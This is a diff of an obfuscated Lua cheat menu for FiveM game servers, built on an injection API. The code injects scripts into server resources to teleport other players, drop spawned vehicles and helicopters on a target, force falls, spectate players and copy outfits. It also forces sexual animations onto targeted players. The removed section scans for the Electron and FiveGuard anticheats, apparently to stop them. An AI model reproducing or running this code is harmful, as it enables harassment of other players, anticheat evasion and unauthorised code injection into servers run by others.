-MachoMenuText(PlayerManipSection, "BringV2 Exploit")
-
--- EAC ID text input
-local EACIDInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target ID", "e.g., 668")
-
--- Carry Button
-MachoMenuButton(PlayerManipSection, "Start BringV2", function()
-    local eacID = tonumber(MachoMenuGetInputbox(EACIDInputBoxHandle))
-    if eacID and eacID > 0 then
-        MachoMenuNotification("Carry System", "Carry process started! ID: " .. eacID)
-        MachoInjectResource('monitor', string.format([[
+    ]],v372,v372,v372));MachoMenuNotification("Info","Drafter vehicle spawned, target ID: "   .. v372 );break;end end end local v133=MachoMenuInputbox(v91,"Target Player ID","e.g., 123");MachoMenuButton(v91,"Start Blackhole",function() if v125 then MachoMenuNotification("Error","Blackhole is already active! Stop it first.");return;end local v374=tonumber(MachoMenuGetInputbox(v133));if ( not v374 or (v374<=(482 -(14 + 468)))) then local v571=0;while true do if (v571==(0 -0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end local v375=GetPlayerFromServerId(v374);if (v375== -(2 -1)) then local v572=0 + 0 ;while true do if (v572==(0 + 0)) then MachoMenuNotification("Error","Player not found! ID: "   .. v374 );return;end end end local v376=GetPlayerPed(v375);if ( not v376 or (v376<=(0 + 0))) then local v573=0;while true do if (v573==(0 + 0)) then MachoMenuNotification("Error","Invalid player ped! ID: "   .. v374 );return;end end end v130(v374);end);MachoMenuButton(v91,"Stop Blackhole",function() v131();end);MachoMenuButton(v91,"Spawn Vehicle",function() local v377=0;local v378;local v379;local v380;while true do if (v377==(1 + 1)) then v380=GetPlayerPed(v379);if ( not v380 or (v380<=(0 -0))) then MachoMenuNotification("Error","Invalid player ped! ID: "   .. v378 );return;end v377=3;end if ((1 + 0)==v377) then v379=GetPlayerFromServerId(v378);if (v379== -(3 -2)) then MachoMenuNotification("Error","Player not found! ID: "   .. v378 );return;end v377=2;end if (v377==0) then v378=tonumber(MachoMenuGetInputbox(v133));if ( not v378 or (v378<=0)) then local v837=0;while true do if (v837==(0 + 0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v377=1;end if (v377==(54 -(12 + 39))) then v132(v378);break;end end end);local function v134() local v381=0 + 0 ;while true do if (v381==(9 -6)) then _G['vehicles']=nil;break;end if (v381==(6 -4)) then _G['isBlackholeActive']=nil;_G['targetPed']=nil;v381=3;end if (v381==(1 + 0)) then _G['StopBlackhole']=nil;_G['SpawnDrafter']=nil;v381=2;end if ((0 + 0)==v381) then _G['GetRandomVehicleModel']=nil;_G['StartBlackhole']=nil;v381=2 -1 ;end end end Citizen.CreateThread(function() Citizen.Wait(667 + 333 );v134();end);MachoMenuText(v91,"BringV2 Exploit");local v135=MachoMenuInputbox(v91,"Target ID","e.g., 668");MachoMenuButton(v91,"Start BringV2",function() local v382=tonumber(MachoMenuGetInputbox(v135));if (v382 and (v382>(0 -0))) then local v574=1710 -(1596 + 114) ;while true do if ((0 -0)==v574) then MachoMenuNotification("Carry System","Carry process started! ID: "   .. v382 );MachoInjectResource("monitor",string.format([[
             CreateThread(function()
                 Wait(1000)
 
@@ -5045,15 +2036,7 @@ MachoMenuButton(PlayerManipSection, "Start BringV2", function()
                 -- Drop complete, send chat message
                 TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Drop complete! ID: ' .. targetId } })
             end)
-        ]], eacID, eacID))
-    else
-        MachoMenuNotification("Error", "Please enter a valid EAC ID!")
-    end
-end)
-
--- All Bring - Safe (Auto brings all players one by one)
-MachoMenuButton(PlayerManipSection, "All Bring - Safe", function()
-    MachoInjectResource('monitor', [[
+        ]],v382,v382));break;end end else MachoMenuNotification("Error","Please enter a valid EAC ID!");end end);MachoMenuButton(v91,"All Bring - Safe",function() local v383=0;while true do if (v383==(713 -(164 + 549))) then MachoInjectResource("monitor",[[
         CreateThread(function()
             Wait(1000)
 
@@ -5117,24 +2100,7 @@ MachoMenuButton(PlayerManipSection, "All Bring - Safe", function()
             print(">> All " .. brought .. " players brought to you!")
             TriggerEvent('chat:addMessage', { args = { '^2All Bring:', '✅ All ' .. brought .. ' players brought to your location!' } })
         end)
-    ]])
-
-    MachoMenuNotification("All Bring", "Bringing all players to you one by one...")
-end)
-
--- RainCar Spawn
-MachoMenuText(PlayerManipSection, "RainCar Spawn")
-local VehicleModelInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Vehicle Model", "Enter vehicle name")
-
--- Start Button
-MachoMenuButton(PlayerManipSection, "Start Vehicle Rain", function()
-    local model = MachoMenuGetInputbox(VehicleModelInputBoxHandle)
-    if model == nil or model == "" then
-        MachoMenuNotification("Error", "Please enter a valid vehicle model!")
-        return
-    end
-
-    MachoInjectResource("monitor", string.format([[
+    ]]);MachoMenuNotification("All Bring","Bringing all players to you one by one...");break;end end end);MachoMenuText(v91,"RainCar Spawn");local v77=MachoMenuInputbox(v91,"Vehicle Model","Enter vehicle name");MachoMenuButton(v91,"Start Vehicle Rain",function() local v384=1438 -(1059 + 379) ;local v385;while true do if (v384==(1 -0)) then MachoInjectResource("monitor",string.format([[
         if careverActive then
             print("Carever is already running.")
             return
@@ -5163,48 +2129,10 @@ MachoMenuButton(PlayerManipSection, "Start Vehicle Rain", function()
                 Citizen.Wait(350)
             end
         end)
-    ]], model))
-    MachoMenuNotification("Troll", "Vehicle rain started for everyone with model: " .. model)
-end)
-
--- Stop Button
-MachoMenuButton(PlayerManipSection, "Stop Vehicle Rain", function()
-    MachoInjectResource("monitor", [[
+    ]],v385));MachoMenuNotification("Troll","Vehicle rain started for everyone with model: "   .. v385 );break;end if (v384==(0 + 0)) then v385=MachoMenuGetInputbox(v77);if ((v385==nil) or (v385=="")) then MachoMenuNotification("Error","Please enter a valid vehicle model!");return;end v384=1;end end end);MachoMenuButton(v91,"Stop Vehicle Rain",function() MachoInjectResource("monitor",[[
         careverActive = false
         print("Car ever has been stopped.")
-    ]])
-    MachoMenuNotification("Troll", "Vehicle rain has been stopped.")
-end)
-
--- Helicopter Spawn
-MachoMenuText(PlayerManipSection, "Helicopter Spawn")
-
--- Global variables
-local isHelicopterSpawning = false
-local helicopterSpawnThread = nil
-
--- Target player ID input
-local HelicopterLoopTargetInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Helicopter Rain ID", "e.g., 123")
-
--- Start Helicopter Rain
-MachoMenuButton(PlayerManipSection, "Start Helicopter Rain", function()
-    local targetId = tonumber(MachoMenuGetInputbox(HelicopterLoopTargetInputBoxHandle))
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-
-    if isHelicopterSpawning then
-        MachoMenuNotification("Warning", "Already started. Use stop button to end.")
-        return
-    end
-
-    isHelicopterSpawning = true
-    MachoMenuNotification("Helicopter System", "Rain started! Target ID: " .. targetId)
-
-    helicopterSpawnThread = CreateThread(function()
-        while isHelicopterSpawning do
-            MachoInjectResource('monitor', string.format([[
+    ]]);MachoMenuNotification("Troll","Vehicle rain has been stopped.");end);MachoMenuText(v91,"Helicopter Spawn");local v136=false;local v137=nil;local v138=MachoMenuInputbox(v91,"Helicopter Rain ID","e.g., 123");MachoMenuButton(v91,"Start Helicopter Rain",function() local v386=tonumber(MachoMenuGetInputbox(v138));if ( not v386 or (v386<=(0 + 0))) then local v575=0;while true do if (v575==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end if v136 then local v576=392 -(145 + 247) ;while true do if (v576==0) then MachoMenuNotification("Warning","Already started. Use stop button to end.");return;end end end v136=true;MachoMenuNotification("Helicopter System","Rain started! Target ID: "   .. v386 );v137=CreateThread(function() while v136 do local v577=0 + 0 ;while true do if (v577==0) then MachoInjectResource("monitor",string.format([[
                 local helicopterModel = "volatus"
                 local targetPlayer = GetPlayerFromServerId(%d)
                 if targetPlayer == -1 then return end
@@ -5219,51 +2147,7 @@ MachoMenuButton(PlayerManipSection, "Start Helicopter Rain", function()
                     SetVehicleEngineOn(helicopter, true, true, false)
                     SetEntityVelocity(helicopter, 0.0, 0.0, -50.0)
                 end
-            ]], targetId))
-            Wait(1000) -- Every 4 seconds
-        end
-    end)
-end)
-
--- Stop Helicopter Rain
-MachoMenuButton(PlayerManipSection, "Stop Helicopter Rain", function()
-    if isHelicopterSpawning then
-        isHelicopterSpawning = false
-        helicopterSpawnThread = nil
-        MachoMenuNotification("Helicopter System", "Helicopter rain stopped.")
-    else
-        MachoMenuNotification("Info", "Already stopped.")
-    end
-end)
-
--- ============================================================
--- SPECTATE PLAYER (Selected Player)
--- ============================================================
-
-local spectateActive = false
-local spectateTargetId = nil
-local SpectateInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Spectate)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Spectate Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(SpectateInputBoxHandle))
-    
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    
-    if not spectateActive then
-        -- Start spectating
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+            ]],v386));Wait(463 + 537 );break;end end end end);end);MachoMenuButton(v91,"Stop Helicopter Rain",function() if v136 then v136=false;v137=nil;MachoMenuNotification("Helicopter System","Helicopter rain stopped.");else MachoMenuNotification("Info","Already stopped.");end end);local v139=false;local v140=nil;local v141=MachoMenuInputbox(v91,"Target Player ID (Spectate)","e.g., 123");MachoMenuButton(v91,"Spectate Player",function() local v387=tonumber(MachoMenuGetInputbox(v141));if ( not v387 or (v387<=(0 -0))) then local v578=0;while true do if (v578==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end if  not v139 then local v579=nil;if (GetResourceState("monitor")=="started") then v579="monitor";elseif (GetResourceState("qb-core")=="started") then v579="qb-core";else v579="ox_inventory";end MachoInjectResource2(NewThreadNs,v579,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -5297,24 +2181,7 @@ MachoMenuButton(PlayerManipSection, "Spectate Player", function()
             local targetName = GetPlayerName(targetPlayer)
             print("Spectate: Spectating " .. targetName)
             TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
-        ]], targetId))
-        
-        spectateActive = true
-        spectateTargetId = targetId
-        MachoMenuNotification("Spectate", "Spectating player ID: " .. targetId)
-        
-    else
-        -- Stop spectating
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, [[
+        ]],v387));v139=true;v140=v387;MachoMenuNotification("Spectate","Spectating player ID: "   .. v387 );else local v580=0 + 0 ;local v581;while true do if (v580==(1 + 0)) then MachoInjectResource2(NewThreadNs,v581,[[
             if _G.spectateActive then
                 _G.spectateActive = false
                 _G.spectateTargetPed = nil
@@ -5327,27 +2194,7 @@ MachoMenuButton(PlayerManipSection, "Spectate Player", function()
                 print("Spectate: Stopped spectating")
                 TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
             end
-        ]])
-        
-        spectateActive = false
-        spectateTargetId = nil
-        MachoMenuNotification("Spectate", "Spectate stopped")
-    end
-end)
-
--- Stop Spectate (Separate Button)
-MachoMenuButton(PlayerManipSection, "Stop Spectate", function()
-    if spectateActive then
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, [[
+        ]]);v139=false;v580=2;end if ((0 -0)==v580) then v581=nil;if (GetResourceState("monitor")=="started") then v581="monitor";elseif (GetResourceState("qb-core")=="started") then v581="qb-core";else v581="ox_inventory";end v580=721 -(254 + 466) ;end if (v580==2) then v140=nil;MachoMenuNotification("Spectate","Spectate stopped");break;end end end end);MachoMenuButton(v91,"Stop Spectate",function() if v139 then local v582=nil;if (GetResourceState("monitor")=="started") then v582="monitor";elseif (GetResourceState("qb-core")=="started") then v582="qb-core";else v582="ox_inventory";end MachoInjectResource2(NewThreadNs,v582,[[
             if _G.spectateActive then
                 _G.spectateActive = false
                 _G.spectateTargetPed = nil
@@ -5360,30 +2207,7 @@ MachoMenuButton(PlayerManipSection, "Stop Spectate", function()
                 print("Spectate: Stopped spectating")
                 TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
             end
-        ]])
-        
-        spectateActive = false
-        spectateTargetId = nil
-        MachoMenuNotification("Spectate", "Spectate stopped")
-    else
-        MachoMenuNotification("Spectate", "Not currently spectating")
-    end
-end)
-
--- Alternative: Toggle Spectate (One Button)
-local spectateToggleActive = false
-local SpectateToggleInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Spectate Toggle)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Spectate Toggle", function()
-    local targetId = tonumber(MachoMenuGetInputbox(SpectateToggleInputBoxHandle))
-    
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    
-    -- Toggle spectate on/off with the same button
-    MachoInjectResource2(NewThreadNs, 'monitor', string.format([[
+        ]]);v139=false;v140=nil;MachoMenuNotification("Spectate","Spectate stopped");else MachoMenuNotification("Spectate","Not currently spectating");end end);local v142=false;local v143=MachoMenuInputbox(v91,"Target Player ID (Spectate Toggle)","e.g., 123");MachoMenuButton(v91,"Spectate Toggle",function() local v388=560 -(544 + 16) ;local v389;while true do if (v388==(0 -0)) then v389=tonumber(MachoMenuGetInputbox(v143));if ( not v389 or (v389<=(628 -(294 + 334)))) then local v838=0;while true do if (v838==(253 -(236 + 17))) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v388=1 + 0 ;end if (v388==(1 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",string.format([[
         local targetServerId = %d
         
         if not _G.spectateActive then
@@ -5433,43 +2257,7 @@ MachoMenuButton(PlayerManipSection, "Spectate Toggle", function()
             print("Spectate: Stopped spectating")
             TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
         end
-    ]], targetId, targetId, targetId))
-    
-    if not spectateToggleActive then
-        spectateToggleActive = true
-        MachoMenuNotification("Spectate", "Spectating player ID: " .. targetId)
-    else
-        spectateToggleActive = false
-        MachoMenuNotification("Spectate", "Spectate stopped")
-    end
-end)
-
--- ============================================================
--- S1 TELEPORT TO PLAYER (Selected Player)
--- ============================================================
-
-local TeleportPlayerInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (S1 Teleport)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Teleport to Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(TeleportPlayerInputBoxHandle))
-    
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    
-    MachoMenuNotification("S1 Teleport", "Teleporting to player ID: " .. targetId)
-    
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+    ]],v389,v389,v389));if  not v142 then local v839=0;while true do if (v839==(0 -0)) then v142=true;MachoMenuNotification("Spectate","Spectating player ID: "   .. v389 );break;end end else v142=false;MachoMenuNotification("Spectate","Spectate stopped");end break;end end end);local v144=MachoMenuInputbox(v91,"Target Player ID (S1 Teleport)","e.g., 123");MachoMenuButton(v91,"S1 Teleport to Player",function() local v390=0 -0 ;local v391;local v392;while true do if (v390==2) then if (GetResourceState("monitor")=="started") then v392="monitor";elseif (GetResourceState("qb-core")=="started") then v392="qb-core";else v392="ox_inventory";end MachoInjectResource2(NewThreadNs,v392,string.format([[
         local targetServerId = %d
         local targetPlayer = GetPlayerFromServerId(targetServerId)
         
@@ -5530,35 +2318,7 @@ MachoMenuButton(PlayerManipSection, "S1 Teleport to Player", function()
                 TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
             end
         end
-    ]], targetId))
-end)
-
--- ============================================================
--- S1 FORCE FALL ONCE (Selected Player)
--- ============================================================
-
-local ForceFallInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Force Fall)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Force Fall Once", function()
-    local targetId = tonumber(MachoMenuGetInputbox(ForceFallInputBoxHandle))
-    
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    
-    MachoMenuNotification("Force Fall", "Forcing player ID: " .. targetId .. " to fall")
-    
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+    ]],v391));break;end if ((1 + 0)==v390) then MachoMenuNotification("S1 Teleport","Teleporting to player ID: "   .. v391 );v392=nil;v390=2;end if (v390==(0 + 0)) then v391=tonumber(MachoMenuGetInputbox(v144));if ( not v391 or (v391<=(794 -(413 + 381)))) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end v390=1;end end end);local v145=MachoMenuInputbox(v91,"Target Player ID (Force Fall)","e.g., 123");MachoMenuButton(v91,"S1 Force Fall Once",function() local v393=0;local v394;local v395;while true do if (v393==(1 + 0)) then MachoMenuNotification("Force Fall","Forcing player ID: "   .. v394   .. " to fall" );v395=nil;v393=2;end if (v393==(3 -1)) then if (GetResourceState("monitor")=="started") then v395="monitor";elseif (GetResourceState("qb-core")=="started") then v395="qb-core";else v395="ox_inventory";end MachoInjectResource2(NewThreadNs,v395,string.format([[
         local targetServerId = %d
         local targetPlayer = GetPlayerFromServerId(targetServerId)
         
@@ -5587,35 +2347,7 @@ MachoMenuButton(PlayerManipSection, "S1 Force Fall Once", function()
         local targetName = GetPlayerName(targetPlayer)
         print("Force Fall: Forced " .. targetName .. " to fall")
         TriggerEvent('chat:addMessage', { args = { '^2Force Fall:', 'Forced ' .. targetName .. ' (ID: ' .. targetServerId .. ') to fall' } })
-    ]], targetId))
-end)
-
--- ============================================================
--- S1 COPY OUTFIT (Selected Player)
--- ============================================================
-
-local CopyOutfitInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Copy Outfit)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Copy Outfit", function()
-    local targetId = tonumber(MachoMenuGetInputbox(CopyOutfitInputBoxHandle))
-    
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-    
-    MachoMenuNotification("Copy Outfit", "Copying outfit from ID: " .. targetId)
-    
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+    ]],v394));break;end if (v393==(0 -0)) then v394=tonumber(MachoMenuGetInputbox(v145));if ( not v394 or (v394<=(1970 -(582 + 1388)))) then local v840=0 -0 ;while true do if (v840==(0 + 0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v393=1;end end end);local v146=MachoMenuInputbox(v91,"Target Player ID (Copy Outfit)","e.g., 123");MachoMenuButton(v91,"S1 Copy Outfit",function() local v396=0;local v397;local v398;while true do if (v396==(365 -(326 + 38))) then MachoMenuNotification("Copy Outfit","Copying outfit from ID: "   .. v397 );v398=nil;v396=5 -3 ;end if (v396==(2 -0)) then if (GetResourceState("monitor")=="started") then v398="monitor";elseif (GetResourceState("qb-core")=="started") then v398="qb-core";else v398="ox_inventory";end MachoInjectResource2(NewThreadNs,v398,string.format([[
         local targetServerId = %d
         local targetPlayer = GetPlayerFromServerId(targetServerId)
         
@@ -5682,39 +2414,12 @@ MachoMenuButton(PlayerManipSection, "S1 Copy Outfit", function()
         local targetName = GetPlayerName(targetPlayer)
         print("Copy Outfit: Copied outfit from " .. targetName)
         TriggerEvent('chat:addMessage', { args = { '^2Copy Outfit:', 'Copied outfit from ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
-    ]], targetId))
-end)
-
--- Tab: ERP Menu
-local ERPTab = MachoMenuAddTab(MenuWindow, "ERP Menu")
-
--- Group: ERP Operations
-local ERPSection = MachoMenuGroup(ERPTab, "ERP Operations", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
--- ID text input
-local PlayerIDInput = MachoMenuInputbox(ERPSection, "Target Player ID", "e.g., 1")
-
--- Animation status variable
-local isAnimating = false
-
--- Apply Animation to Specific ID Button
-MachoMenuButton(ERPSection, "Apply Animation to ID / Stop", function()
-    local targetID = MachoMenuGetInputbox(PlayerIDInput)
-    
-    if isAnimating then
-        MachoInjectResource('monitor', [[
+    ]],v397));break;end if (v396==(620 -(47 + 573))) then v397=tonumber(MachoMenuGetInputbox(v146));if ( not v397 or (v397<=0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end v396=1 + 0 ;end end end);local v147=MachoMenuAddTab(v4,"ERP Menu");local v148=MachoMenuGroup(v147,"ERP Operations",v3,38 -29 ,(v1.x-v3) + (243 -93) ,v1.y);local v149=MachoMenuInputbox(v148,"Target Player ID","e.g., 1");local v150=false;MachoMenuButton(v148,"Apply Animation to ID / Stop",function() local v399=MachoMenuGetInputbox(v149);if v150 then MachoInjectResource("monitor",[[
             local playerPed = PlayerPedId()
             ClearPedTasks(playerPed)
             DetachEntity(playerPed, true, true)
             TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
-        ]])
-        MachoMenuNotification("ERP System", "Animation stopped!")
-        isAnimating = false
-        return
-    end
-    
-    if targetID and targetID ~= "" then
-        MachoInjectResource('monitor', string.format([[
+        ]]);MachoMenuNotification("ERP System","Animation stopped!");v150=false;return;end if (v399 and (v399~="")) then local v583=0;while true do if (v583==0) then MachoInjectResource("monitor",string.format([[
             local targetID = %s
             local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
             
@@ -5735,30 +2440,12 @@ MachoMenuButton(ERPSection, "Apply Animation to ID / Stop", function()
             else
                 TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
             end
-        ]], targetID))
-        
-        MachoMenuNotification("ERP System", "Animation applied for ID " .. targetID .. "!")
-        isAnimating = true
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Fuck Nearby Button
-MachoMenuButton(ERPSection, "Fuck Nearby", function()
-    if isAnimating then
-        MachoInjectResource('monitor', [[
+        ]],v399));MachoMenuNotification("ERP System","Animation applied for ID "   .. v399   .. "!" );v583=1;end if (v583==1) then v150=true;break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v148,"Fuck Nearby",function() local v400=1664 -(1269 + 395) ;while true do if (v400==(492 -(76 + 416))) then if v150 then local v841=443 -(319 + 124) ;while true do if (v841==(0 -0)) then MachoInjectResource("monitor",[[
             local playerPed = PlayerPedId()
             ClearPedTasks(playerPed)
             DetachEntity(playerPed, true, true)
             TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
-        ]])
-        MachoMenuNotification("ERP System", "Animation stopped!")
-        isAnimating = false
-        return
-    end
-    
-    MachoInjectResource('monitor', [[
+        ]]);MachoMenuNotification("ERP System","Animation stopped!");v841=1008 -(564 + 443) ;end if (v841==(2 -1)) then v150=false;return;end end end MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         local playerCoords = GetEntityCoords(playerPed)
         local peds = {}
@@ -5804,29 +2491,14 @@ MachoMenuButton(ERPSection, "Fuck Nearby", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable ped found nearby!' } })
         end
-    ]])
-    
-    MachoMenuNotification("ERP System", "Animation applied to nearby ped!")
-    isAnimating = true
-end)
-
--- Fuck Nearby Exhaust Button
-MachoMenuButton(ERPSection, "Fuck Nearby Exhaust", function()
-    if isAnimating then
-        MachoInjectResource('monitor', [[
+    ]]);v400=459 -(337 + 121) ;end if ((2 -1)==v400) then MachoMenuNotification("ERP System","Animation applied to nearby ped!");v150=true;break;end end end);MachoMenuButton(v148,"Fuck Nearby Exhaust",function() local v401=0 -0 ;while true do if (v401==0) then if v150 then local v842=1911 -(1261 + 650) ;while true do if (v842==1) then v150=false;return;end if (v842==(0 + 0)) then MachoInjectResource("monitor",[[
             local playerPed = PlayerPedId()
             ClearPedTasks(playerPed)
             DetachEntity(playerPed, true, true)
             local originalCoords = GetEntityCoords(playerPed)
             SetEntityCoords(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
             TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped and returned to original position!' } })
-        ]])
-        MachoMenuNotification("ERP System", "Animation stopped and returned to original position!")
-        isAnimating = false
-        return
-    end
-    
-    MachoInjectResource('monitor', [[
+        ]]);MachoMenuNotification("ERP System","Animation stopped and returned to original position!");v842=1 -0 ;end end end MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         local playerCoords = GetEntityCoords(playerPed)
         local maxAttachDistance = 10.0
@@ -5883,30 +2555,7 @@ MachoMenuButton(ERPSection, "Fuck Nearby Exhaust", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable vehicle found nearby!' } })
         end
-    ]])
-    
-    MachoMenuNotification("ERP System", "Animation applied to nearby vehicle exhaust!")
-    isAnimating = true
-end)
-
--- Apply Mouth Animation Button (Target ID gets 1st animation, self gets 2nd)
-MachoMenuButton(ERPSection, "Apply Mouth Animation", function()
-    if isAnimating then
-        MachoInjectResource('monitor', [[
-            local playerPed = PlayerPedId()
-            ClearPedTasks(playerPed)
-            DetachEntity(playerPed, true, true)
-            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
-        ]])
-        MachoMenuNotification("ERP System", "Animation stopped!")
-        isAnimating = false
-        return
-    end
-    
-    local targetID = MachoMenuGetInputbox(PlayerIDInput)
-    
-    if targetID and targetID ~= "" then
-        MachoInjectResource('monitor', string.format([[
+    ]]);v401=1;end if ((1818 -(772 + 1045))==v401) then MachoMenuNotification("ERP System","Animation applied to nearby vehicle exhaust!");v150=true;break;end end end);MachoMenuButton(v148,"Apply Mouth Animation",function() local v402=0 + 0 ;local v403;while true do if (v402==1) then if (v403 and (v403~="")) then MachoInjectResource("monitor",string.format([[
             local targetID = %s
             local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
             
@@ -5951,249 +2600,12 @@ MachoMenuButton(ERPSection, "Apply Mouth Animation", function()
             else
                 TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
             end
-        ]], targetID))
-        
-        MachoMenuNotification("ERP System", "Mouth animation applied for ID " .. targetID .. " and your character is also animated!")
-        isAnimating = true
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- ERP Menu Close
--- ERPSection and ERPTab automatically close
-
--- Menu Window (Assuming MenuWindow is already defined)
--- local MenuWindow = ... (Should be defined according to Macho API)
-
--- Anticheat Checker Menu
-local AntiCheatTab = MachoMenuAddTab(MenuWindow, "Anticheat Check")
-
--- Pull UP with small value (e.g., 10)
-local SectionStartY = 10
-local SectionPadding = 5
-
--- Anticheat Checker Group
-local AntiCheatSection = MachoMenuGroup(AntiCheatTab, "Anticheat Checker", TabSectionWidth, SectionStartY, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
--- Variables for detected resource names and statuses
-local detectedElectronResource = ""
-local isElectronStopped = false
-local detectedFiveGuardResource = ""
-local isFiveGuardStopped = false
-
--- Electron Anticheat Scan Function
-local function ScanElectronAnticheat()
-    local foundAnticheat = false
-    local foundScriptName = ""
-
-    local resources = GetNumResources()
-    for i = 0, resources - 1 do
-        local resource = GetResourceByFindIndex(i)
-        -- Try to load fxmanifest.lua
-        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
-        if manifest then
-            -- Search for Electron Anticheat specific text
-            if string.find(manifest, "https://electron-services.com") or 
-            string.find(manifest, "Electron Services") or 
-            string.find(manifest, "The most advanced fiveM anticheat") then
-                foundAnticheat = true
-                foundScriptName = resource
-                detectedElectronResource = resource -- Store detected resource
-                break
-            end
-        end
-    end
-
-    return foundAnticheat, foundScriptName
-end
-
--- FiveGuard Anticheat Scan Function
-local function ScanFiveGuardAnticheat()
-    local foundAnticheat = false
-    local foundScriptName = ""
-
-    local resources = GetNumResources()
-    for i = 0, resources - 1 do
-        local resource = GetResourceByFindIndex(i)
-        local files = GetNumResourceMetadata(resource, 'client_script')
-        for j = 0, files - 1 do
-            local metadata = GetResourceMetadata(resource, 'client_script', j)
-            if metadata ~= nil then
-                if string.find(metadata, "obfuscated") then
-                    foundAnticheat = true
-                    foundScriptName = resource
-                    detectedFiveGuardResource = resource -- Store detected resource
-                    break
-                end
-            end
-        end
-        if foundAnticheat then break end
-    end
